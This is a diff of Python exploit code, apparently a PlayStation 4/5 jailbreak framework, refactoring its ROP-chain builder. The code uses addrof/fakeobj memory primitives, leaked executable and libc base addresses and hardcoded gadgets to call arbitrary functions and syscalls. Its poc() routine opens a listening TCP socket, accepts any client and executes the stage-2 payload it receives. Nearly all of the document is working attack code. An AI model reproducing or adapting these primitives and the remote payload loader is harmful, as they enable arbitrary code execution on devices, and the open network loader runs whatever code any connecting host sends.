@@ -512,9 +512,11 @@ class ROPChain(object):
 
     def reset(self):
         self.index = 0
-        self.chain = bytearray(len(self.chain))
+        self.chain[:] = b"\0" * len(self.chain)
 
     def append(self, value):
+        if self.index + 8 > len(self.chain):
+            raise Exception("ROP chain overflow")
         self.chain[self.index : self.index + 8] = struct.pack("<Q", value)
         self.index += 8
 
@@ -579,9 +581,9 @@ class ROPChain(object):
         self.push_gadget("mov [rsi], rax; ret")
 
     def push_get_errno(self):
+        self.push_call(self.sc.libc_addr + SELECTED_LIBC["__error"])
         self.push_gadget("pop rsi; ret")
         self.push_value(self.errno_addr)
-        self.push_call(sc.libc_addr + SELECTED_LIBC["__error"])
         self.push_gadget("mov rax, [rax]; ret")
         self.push_gadget("mov [rsi], rax; ret")
 
@@ -603,62 +605,28 @@ class ROPChain(object):
         self.push_gadget("mov [rsi], rdx; ret")
 
 
-class SploitCore(object):
-    def __init__(self):
-        self.mem = getmem()
+class Executable(object):
+    def __init__(self, sc):
+        self.sc = sc
+        self.chain = ROPChain(sc)
 
-        print("[*] Obtained memory object")
-
-        func_type_addr = addrof(FunctionType)
-        print("[*] FunctionType address: 0x%x" % func_type_addr)
-        func_repr_addr = u64(
-            self.mem[
-                func_type_addr - 0x1000 + 11 * 8 : func_type_addr - 0x1000 + 11 * 8 + 8
-            ]
-        )
-        print("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)
-
-        self.exec_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
-        print("[*] Executable base address: 0x%x" % self.exec_addr)
-        self.modules = {}
-
-        # Use hardcoded gadgets
-        self.gadgets = SELECTED_GADGETS
-
-        self.call_stack = None
-        self.call_contextbuf = None
-        self.call_func = None
-        self.call_functype = None
-        self.call_functype_ptr = None
-        self._prepare_call()
-
-        self.platform = None
-        self.version = None
-        self._prepare_syscall()
-
-    @property
-    def errno(self):
-        errno_addr = self.libc_addr + SELECTED_LIBC["__error"]
-        errno_ptr = self.run_function(errno_addr)
-        errno = readuint(errno_ptr, 8)
-        return errno
-
-    def __getattr__(self, name):
-        return self.modules.get(name.lower())
-
-    def _prepare_call(self):
         CONTEXT_SZ = 0x210
 
         # allocate the objects we need, so they can be used/reused by call()
-        self.call_stack = bytearray(0x100000)
         self.call_contextbuf = bytearray(CONTEXT_SZ)
+        self.call_contextbuf[0x38:0x40] = p64a(self.chain.addr)
+        self.call_contextbuf[0x130:0x138] = p64a(
+            self.sc.libc_addr + self.sc.gadgets["mov rsp, [rdi + 0x38]; pop rdi; ret"]
+        )
 
         # make a copy of the built-in function type object
         self.call_functype = readbuf(addrof(FunctionType), sizeof(FunctionType))
 
         self.call_functype[16 * 8 : 16 * 8 + 8] = p64a(
-            self.exec_addr
-            + self.gadgets["push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]"]
+            self.sc.exec_addr
+            + self.sc.gadgets[
+                "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]"
+            ]
         )
 
         # note: user must patch tp_call before use e.g.
@@ -675,9 +643,182 @@ class SploitCore(object):
         # print("my_func_ptr", hex(my_func_ptr))
         self.call_func = fakeobj(self.my_func_ptr)
 
-    def _prepare_syscall(self):
-        INIT_PROC_ADDR_OFFSET = 0x128
-        SEGMENTS_OFFSET = 0x160
+    @property
+    def errno(self):
+        return self.chain.errno
+
+    def setup_front_chain(self):
+        self.chain.push_value(0)
+
+        # add bunch of padding to align the stack
+        for _ in range(16):
+            self.chain.push_gadget("add rsp, 0x1b8; ret")
+            for _ in range(55):
+                self.chain.push_value(0)
+
+    def setup_call_chain(self, func_addr, rdi, rsi, rdx, rcx, r8, r9):
+        self.chain.push_call(
+            func_addr, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
+        )
+
+        # padding to align the stack
+        self.chain.push_gadget("add rsp, 0x1b8; ret")
+        for _ in range(55):
+            self.chain.push_value(0)
+
+    def setup_syscall_chain(self, syscall_number, rdi, rsi, rdx, rcx, r8, r9):
+        self.chain.push_syscall(
+            syscall_number, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
+        )
+
+        # padding to align the stack
+        self.chain.push_gadget("add rsp, 0x1b8; ret")
+        for _ in range(55):
+            self.chain.push_value(0)
+
+    def setup_post_chain(self):
+        self.chain.push_get_return_value()
+        self.chain.push_get_errno()
+
+    def setup_back_chain(self):
+        self.chain.push_gadget("pop r8; ret")
+        self.chain.push_value(addrof(None) + 0x7D)
+        self.chain.push_gadget("pop rcx; ret")
+        self.chain.push_value(1)
+        self.chain.push_gadget("add [r8 - 0x7d], rcx; ret")
+        self.chain.push_gadget("pop rax; ret")
+        self.chain.push_value(addrof(None))
+        self.chain.push_gadget("mov rsp, rbp; pop rbp; ret")
+
+    def execute(self):
+        self.call_func(*tuple(), **dict())
+        return self.chain.return_value
+
+    def __call__(self, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
+        pass
+
+
+class Function(Executable):
+    def __init__(self, sc, func_addr):
+        super(Function, self).__init__(sc)
+        self.func_addr = func_addr
+
+    def __call__(self, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
+        self.chain.reset()
+        self.setup_front_chain()
+        self.setup_call_chain(
+            self.func_addr, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
+        )
+        self.setup_post_chain()
+        self.setup_back_chain()
+        return self.execute()
+
+
+class Syscall(Executable):
+    def __init__(self, sc, syscall_number):
+        super(Syscall, self).__init__(sc)
+        self.syscall_number = syscall_number
+        if self.sc.platform == "ps4" and syscall_number not in self.sc.syscall_table:
+            raise Exception("Syscall number %d not found" % syscall_number)
+
+    def __call__(self, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
+        pipe_on_ps5 = (
+            self.syscall_number == SYSCALL["pipe"] and self.sc.platform == "ps5"
+        )
+        if pipe_on_ps5:
+            rax_buf = alloc(8)
+            rdx_buf = alloc(8)
+
+        self.chain.reset()
+        self.setup_front_chain()
+        self.setup_syscall_chain(
+            self.syscall_number, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
+        )
+        self.setup_post_chain()
+
+        if pipe_on_ps5:
+            self.chain.push_gadget("pop rsi; ret")
+            self.chain.push_value(refbytearray(rax_buf))
+            self.chain.push_gadget("mov [rsi], rax; ret")
+            self.chain.push_gadget("pop rsi; ret")
+            self.chain.push_value(refbytearray(rdx_buf))
+            self.chain.push_gadget("mov [rsi], rdx; ret")
+
+        self.setup_back_chain()
+        ret = self.execute()
+
+        if pipe_on_ps5:
+            self.sc.mem[rdi - 0x1000 : rdi - 0x1000 + 4] = rax_buf[0:4]
+            self.sc.mem[rdi - 0x1000 + 4 : rdi - 0x1000 + 8] = rdx_buf[0:4]
+
+        return ret
+
+    def get_error_string(self):
+        errstr_addr = self.sc.functions.strerror(self.errno)
+        errstr = get_cstring(self.sc.mem, errstr_addr)
+        return errstr
+
+
+class FunctionContainer(object):
+    def __init__(self, sc):
+        self.sc = sc
+        self.functions = {}
+
+    def __setattr__(self, name, value):
+        if name in ("sc", "functions"):
+            object.__setattr__(self, name, value)
+        else:
+            self.functions[name] = value
+
+    def __getattr__(self, name):
+        func_name = name
+        if func_name not in self.functions:
+            if func_name in SELECTED_LIBC:
+                func_addr = self.sc.libc_addr + SELECTED_LIBC[func_name]
+            elif func_name in SELECTED_EXEC:
+                func_addr = self.sc.exec_addr + SELECTED_EXEC[func_name]
+            else:
+                raise Exception("Function %s not found" % func_name)
+            func = Function(self.sc, func_addr)
+            self.functions[func_name] = func
+        return self.functions[func_name]
+
+
+class SyscallContainer(object):
+    def __init__(self, sc):
+        self.sc = sc
+        self.syscalls = {}
+
+    def __setattr__(self, name, value):
+        if name in ("sc", "syscalls"):
+            object.__setattr__(self, name, value)
+        else:
+            self.syscalls[name] = value
+
+    def __getattr__(self, name):
+        syscall_name = name
+        if syscall_name not in self.syscalls:
+            if syscall_name not in SYSCALL:
+                raise Exception("Syscall %s not found" % syscall_name)
+            syscall_number = SYSCALL[syscall_name]
+            syscall = Syscall(self.sc, syscall_number)
+            self.syscalls[syscall_name] = syscall
+        return self.syscalls[syscall_name]
+
+
+class SploitCore(object):
+    def __init__(self):
+        self.mem = getmem()
+
+        print("[*] Obtained memory object")
+
+        func_type_addr = addrof(FunctionType)
+        print("[*] FunctionType address: 0x%x" % func_type_addr)
+        func_repr_addr = readuint(func_type_addr + 11 * 8, 8)
+        print("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)
+
+        self.exec_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
+        print("[*] Executable base address: 0x%x" % self.exec_addr)
 
         self.libc_addr = (
             readuint(self.exec_addr + SELECTED_EXEC["strcmp"], 8)
@@ -685,14 +826,27 @@ class SploitCore(object):
         )
         print("[*] libc base address: 0x%x" % self.libc_addr)
 
-        self.call_contextbuf[0x130:0x138] = p64a(
-            self.libc_addr + self.gadgets["mov rsp, [rdi + 0x38]; pop rdi; ret"]
-        )
+        # Use hardcoded gadgets
+        self.gadgets = SELECTED_GADGETS
+
+        self.functions = FunctionContainer(self)
+        self.syscalls = SyscallContainer(self)
+
+        self.platform = None
+        self.version = None
+        self._prepare_syscall()
+
+    def _prepare_syscall(self):
+        INIT_PROC_ADDR_OFFSET = 0x128
+        SEGMENTS_OFFSET = 0x160
 
         gettimeofday_in_libkernel = readuint(
             self.libc_addr + SELECTED_LIBC["gettimeofday"], 8
         )
         print("[*] gettimeofday address: 0x%x" % gettimeofday_in_libkernel)
+
+        # eh why not
+        self.make_function_if_needed("gettimeofday", gettimeofday_in_libkernel)
 
         mod_info = bytes([b"\0"] * 0x300)
         nogc.append(mod_info)
@@ -700,15 +854,12 @@ class SploitCore(object):
         sceKernelGetModuleInfoFromAddr_addr = readuint(
             self.libc_addr + SELECTED_LIBC["sceKernelGetModuleInfoFromAddr"], 8
         )
-        print(
-            "[*] sceKernelGetModuleInfoFromAddr address: 0x%x"
-            % sceKernelGetModuleInfoFromAddr_addr
-        )
-        ret = self.run_function(
-            sceKernelGetModuleInfoFromAddr_addr,
+        ret = self.make_function_if_needed(
+            "sceKernelGetModuleInfoFromAddr", sceKernelGetModuleInfoFromAddr_addr
+        )(
             gettimeofday_in_libkernel,
             1,
-            refbytes(mod_info),
+            mod_info,
         )
 
         if ret != 0:
@@ -768,161 +919,21 @@ class SploitCore(object):
         size = alloc(8)
         size[0:8] = struct.pack("<Q", 8)
         if self.sysctl("kern.sdk_version", buf, size):
-            lower, upper = struct.unpack("<BB", buf[0:2])
+            lower, upper = struct.unpack("<BB", buf[2:4])
             self.version = "%x.%02x" % (upper, lower)
             print("[*] Detected OS version: %s" % self.version)
         else:
             print("[*] Could not detect OS version")
 
-    def run_function(
-        self,
-        func_addr,
-        rdi=None,
-        rsi=None,
-        rdx=None,
-        rcx=None,
-        r8=None,
-        r9=None,
-        syscall=False,
-        *args
-    ):
-        """
-        Get stack pointer
-        """
+    def make_function_if_needed(self, name, func_addr):
+        if name not in self.functions.functions:
+            self.functions.functions[name] = Function(self, func_addr)
+        return self.functions.functions[name]
 
-        if syscall and self.platform == "ps4" and func_addr not in self.syscall_table:
-            raise Exception("Syscall number %d not found in syscall table" % func_addr)
-
-        # TODO: make syscall object and handle this better
-        if syscall and self.platform == "ps5" and func_addr == SYSCALL["pipe"]:
-            rax_buf = alloc(8)
-            rdx_buf = alloc(8)
-
-        fakedict_bytes = bytes(p64a(0, addrof(dict)))
-        nogc.append(fakedict_bytes)
-
-        fakedict = fakeobj(refbytes(fakedict_bytes))
-        nogc.append(fakedict)
-
-        return_value = b"\0" * 8
-        nogc.append(return_value)
-        args_stack = [0] * 51
-
-        if len(args) > 51:
-            raise Exception("Too many arguments")
-
-        (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)
-
-        for i, arg in enumerate(args):
-            if isinstance(arg, (bytearray, str)):
-                arg = get_ref_addr(arg)
-            args_stack[i] = arg
-
-        stack_data = bytes(
-            p64(
-                flat(
-                    [
-                        rdi if rdi is not None else 0,
-                    ],
-                    flat(
-                        [
-                            self.exec_addr + self.gadgets["add rsp, 0x1b8; ret"],
-                        ],
-                        [0] * 55,
-                    )
-                    * 16,  # for stack alignment and stability
-                    (
-                        [
-                            self.exec_addr + self.gadgets["pop rax; ret"],
-                            func_addr,  # use func_addr as syscall number
-                        ]
-                        if syscall
-                        else []
-                    )
-                    + [
-                        self.exec_addr + self.gadgets["pop rsi; ret"],
-                        rsi if rsi is not None else 0,
-                        self.exec_addr + self.gadgets["pop rdx; ret"],
-                        rdx if rdx is not None else 0,
-                        self.exec_addr + self.gadgets["pop rcx; ret"],
-                        rcx if rcx is not None else 0,
-                        self.exec_addr + self.gadgets["pop r8; ret"],
-                        r8 if r8 is not None else 0,
-                        self.exec_addr + self.gadgets["pop r9; ret"],
-                        r9 if r9 is not None else 0,
-                    ],
-                    [
-                        (
-                            func_addr
-                            if not syscall
-                            else (
-                                self.syscall_addr
-                                if self.platform == "ps5"
-                                else self.syscall_table.get(func_addr, 0)
-                            )
-                        ),
-                        self.exec_addr + self.gadgets["add rsp, 0x1b8; ret"],
-                    ],
-                    [0] * 4,
-                    args_stack,
-                    [
-                        self.exec_addr + self.gadgets["pop rsi; ret"],
-                        refbytes(return_value),
-                        self.exec_addr + self.gadgets["mov [rsi], rax; ret"],
-                    ],
-                    (
-                        [
-                            self.exec_addr + self.gadgets["pop rsi; ret"],
-                            refbytes(rax_buf),
-                            self.exec_addr + self.gadgets["mov [rsi], rax; ret"],
-                            self.exec_addr + self.gadgets["pop rsi; ret"],
-                            refbytes(rdx_buf),
-                            self.exec_addr + self.gadgets["mov [rsi], rdx; ret"],
-                        ]
-                        if syscall
-                        and self.platform == "ps5"
-                        and func_addr == SYSCALL["pipe"]
-                        else []
-                    ),
-                    [
-                        self.exec_addr + self.gadgets["pop r8; ret"],
-                        addrof(None) + 0x7D,
-                        self.exec_addr + self.gadgets["pop rcx; ret"],
-                        1,
-                        self.exec_addr + self.gadgets["add [r8 - 0x7d], rcx; ret"],
-                        self.exec_addr + self.gadgets["pop rax; ret"],
-                        addrof(None),
-                        self.exec_addr + self.gadgets["mov rsp, rbp; pop rbp; ret"],
-                    ],
-                )
-            )
-        )
-
-        self.call_stack[: len(stack_data)] = stack_data
-        self.call_stack_addr = refbytearray(self.call_stack)
-
-        self.call_contextbuf[0x38:0x40] = p64a(self.call_stack_addr)
-
-        self.call_func(*tuple(), **fakedict)
-
-        if syscall and self.platform == "ps5" and func_addr == SYSCALL["pipe"]:
-            self.mem[rdi - 0x1000 : rdi - 0x1000 + 4] = rax_buf[0:4]
-            self.mem[rdi - 0x1000 + 4 : rdi - 0x1000 + 8] = rdx_buf[0:4]
-
-        return struct.unpack("<Q", return_value)[0]
-
-    def get_error_string(
-        self,
-    ):
-        strerror_addr = self.libc_addr + SELECTED_LIBC["strerror"]
-
-        errstr_addr = self.run_function(
-            strerror_addr,
-            self.errno,
-        )
-
-        errstr = get_cstring(self.mem, errstr_addr)
-        return errstr
+    def make_syscall_if_needed(self, name, syscall_number):
+        if name not in self.syscalls.syscalls:
+            self.syscalls.syscalls[name] = Syscall(self, syscall_number)
+        return self.syscalls.syscalls[name]
 
     def send_notification(self, msg):
         icon_uri = b"cxml://psnotification/tex_icon_system"
@@ -938,40 +949,35 @@ class SploitCore(object):
 
         dev_path = b"/dev/notification0\0"
         nogc.append(dev_path)
-        fd = self.run_function(
-            SYSCALL["open"],
+        fd = self.syscalls.open(
             refbytes(dev_path),
             O_WRONLY,
-            syscall=True,
         )
         if fd < 0:
             print("[-] Failed to open notification device")
             return
 
-        self.run_function(
-            SYSCALL["write"],
+        self.syscalls.write(
             fd,
             refbytearray(notify_buf),
             len(notify_buf),
-            syscall=True,
         )
-        self.run_function(
-            SYSCALL["close"],
+        self.syscalls.close(
             fd,
-            syscall=True,
         )
 
     def get_all_network_interfaces(self):
-        count = self.run_function(
-            SYSCALL["netgetiflist"],
+        count = self.syscalls.netgetiflist(
             0,
             10,
-            syscall=True,
         )
         if count == -1:
             raise Exception(
                 "netgetiflist failed to get count, errno: %d\n%s"
-                % (self.errno, self.get_error_string())
+                % (
+                    self.syscalls.netgetiflist.errno,
+                    self.syscalls.netgetiflist.get_error_string(),
+                )
             )
         print("[*] Found %d network interfaces" % count)
 
@@ -980,17 +986,18 @@ class SploitCore(object):
         nogc.append(ifbuf)
 
         if (
-            self.run_function(
-                SYSCALL["netgetiflist"],
+            self.syscalls.netgetiflist(
                 refbytes(ifbuf),
                 count,
-                syscall=True,
             )
             == -1
         ):
             raise Exception(
                 "netgetiflist failed to get interfaces, errno: %d\n%s"
-                % (self.errno, self.get_error_string())
+                % (
+                    self.syscalls.netgetiflist.errno,
+                    self.syscalls.netgetiflist.get_error_string(),
+                )
             )
 
         interfaces = {}
@@ -1021,33 +1028,29 @@ class SploitCore(object):
         translate_name_mib[0:8] = struct.pack("<Q", 0x300000000)
 
         if (
-            self.run_function(
-                SYSCALL["sysctl"],
+            self.syscalls.sysctl(
                 translate_name_mib,
                 2,
                 mib,
                 size,
                 name_bytes,
                 len(name),
-                syscall=True,
             )
             < 0
         ):
             raise Exception(
                 "sysctl failed to translate name to mib, errno: %d\n%s"
-                % (self.errno, self.get_error_string())
+                % (self.syscalls.sysctl.errno, self.syscalls.sysctl.get_error_string())
             )
 
         if (
-            self.run_function(
-                SYSCALL["sysctl"],
+            self.syscalls.sysctl(
                 mib,
                 2,
                 oldp,
                 oldlenp,
                 newp,
                 newlenp,
-                syscall=True,
             )
             < 0
         ):
@@ -1140,9 +1143,7 @@ def create_tcp_socket(sc):
     sockaddr_in[2:4] = struct.pack(">H", PORT)  # sin_port
     sockaddr_in[4:8] = struct.pack(">I", 0)  # sin_addr
 
-    s = u64_to_i64(
-        sc.run_function(SYSCALL["socket"], AF_INET, SOCK_STREAM, syscall=True)
-    )
+    s = u64_to_i64(sc.syscalls.socket(AF_INET, SOCK_STREAM))
     print("[*] Created TCP socket: %d" % s)
     if s < 0:
         raise SocketError(
@@ -1150,20 +1151,16 @@ def create_tcp_socket(sc):
             % (s, sc.errno, sc.get_error_string())
         )
 
-    sc.run_function(
-        SYSCALL["setsockopt"],
+    sc.syscalls.setsockopt(
         s,
         SOL_SOCKET,
         SO_REUSEADDR,
         refbytearray(enable_buf),
         4,
-        syscall=True,
     )
     print("[*] Set socket options: %d" % s)
 
-    bind = u32_to_i32(
-        sc.run_function(SYSCALL["bind"], s, refbytearray(sockaddr_in), 16, syscall=True)
-    )
+    bind = u32_to_i32(sc.syscalls.bind(s, sockaddr_in, 16))
     print("[*] Bound socket: %d" % bind)
     if bind != 0:
         raise SocketError(
@@ -1171,7 +1168,7 @@ def create_tcp_socket(sc):
             % (bind, sc.errno, sc.get_error_string())
         )
 
-    listen = u32_to_i32(sc.run_function(SYSCALL["listen"], s, 3, syscall=True))
+    listen = u32_to_i32(sc.syscalls.listen(s, 3))
     if listen != 0:
         raise SocketError(
             "listen failed with return value %d, error %d\n%s"
@@ -1195,12 +1192,10 @@ def poc():
     print("[*] Creating TCP socket...")
     s = create_tcp_socket(sc)
 
-    sc.run_function(
-        SYSCALL["getsockname"],
+    sc.syscalls.getsockname(
         s,
         refbytearray(sockaddr_in),
         refbytearray(len_buf),
-        syscall=True,
     )
     port = struct.unpack(">H", sockaddr_in[2:4])[0]
 
@@ -1212,42 +1207,44 @@ def poc():
         sc.send_notification("Listening on %s:%d for stage 2 payload..." % (ip, port))
     while True:
         client_sock = u64_to_i64(
-            sc.run_function(
-                SYSCALL["accept"],
+            sc.syscalls.accept(
                 s,
                 refbytearray(sockaddr_in),
                 refbytearray(len_buf),
-                syscall=True,
             )
         )
         if client_sock < 0:
             raise SocketError(
                 "accept failed with return value %d, error %d\n%s"
-                % (client_sock, sc.errno, sc.get_error_string())
+                % (
+                    client_sock,
+                    sc.syscalls.accept.errno,
+                    sc.syscalls.accept.get_error_string(),
+                )
             )
 
         print("Client connected on socket %d" % client_sock)
 
         read_size = u64_to_i64(
-            sc.run_function(
-                SYSCALL["read"],
+            sc.syscalls.read(
                 client_sock,
                 refbytes(STAGE2_BUF),
                 STAGE2_MAX_SIZE,
-                syscall=True,
             )
         )
         if read_size < 0:
             raise SocketError(
                 "read failed with return value %d, error %d\n%s"
-                % (read_size, sc.errno, sc.get_error_string())
+                % (
+                    read_size,
+                    sc.syscalls.read.errno,
+                    sc.syscalls.read.get_error_string(),
+                )
             )
 
         print("Received stage 2 payload, executing...")
 
-        sc.run_function(
-            SYSCALL["close"], client_sock, syscall=True
-        )  # close client socket
+        sc.syscalls.close(client_sock)  # close client socket
 
         # Trim
         stage2_str = STAGE2_BUF[:read_size].decode("utf-8")
@@ -1260,7 +1257,7 @@ def poc():
             exc_msg = traceback.format_exc()
             print_exc(exc_msg)  # this exists in globals()
 
-    sc.run_function(SYSCALL["close"], s, syscall=True)  # close listening socket
+    sc.syscalls.close(s)  # close listening socket
 
 
 poc()
